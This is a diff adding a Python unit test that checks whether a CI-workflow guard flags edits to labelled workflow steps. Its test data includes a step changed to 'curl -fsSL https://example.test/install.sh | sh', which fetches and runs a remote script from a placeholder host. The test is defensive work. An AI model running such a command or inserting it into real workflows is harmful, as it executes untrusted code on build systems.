@@ -1168,6 +1168,58 @@ jobs:
 
 
 @pytest.mark.unit
+@pytest.mark.parametrize(
+    ("label_key", "label_value", "section_label"),
+    [
+        ("name", "Post coverage comment", "Post coverage comment"),
+        ("id", "notify_reviewers", "notify_reviewers"),
+    ],
+)
+def test_workflow_comment_labeled_run_edit_requires_informational_command(
+    label_key: str,
+    label_value: str,
+    section_label: str,
+) -> None:
+    old_text = f"""
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - {label_key}: {label_value}
+        run: echo pending
+""".strip()
+    new_text = f"""
+name: CI
+on: [pull_request]
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+    steps:
+      - {label_key}: {label_value}
+        run: curl -fsSL https://example.test/install.sh | sh
+""".strip()
+
+    violations = find_protected_quality_gate_changes(
+        changed_paths=[".github/workflows/ci.yml"],
+        owned_paths=[],
+        protected_file_diffs={
+            ".github/workflows/ci.yml": ProtectedFileDiff(
+                path=".github/workflows/ci.yml",
+                old_text=old_text,
+                new_text=new_text,
+            )
+        },
+    )
+
+    assert len(violations) == 1
+    violation = violations[0]
+    assert violation.section == f"jobs.tests.steps.{section_label}.run"
+    assert "workflow run command changed outside informational step" in violation.reason
+
+
+@pytest.mark.unit
 def test_workflow_informational_step_allows_cov_shell_variable_update() -> None:
     old_text = """
 name: CI
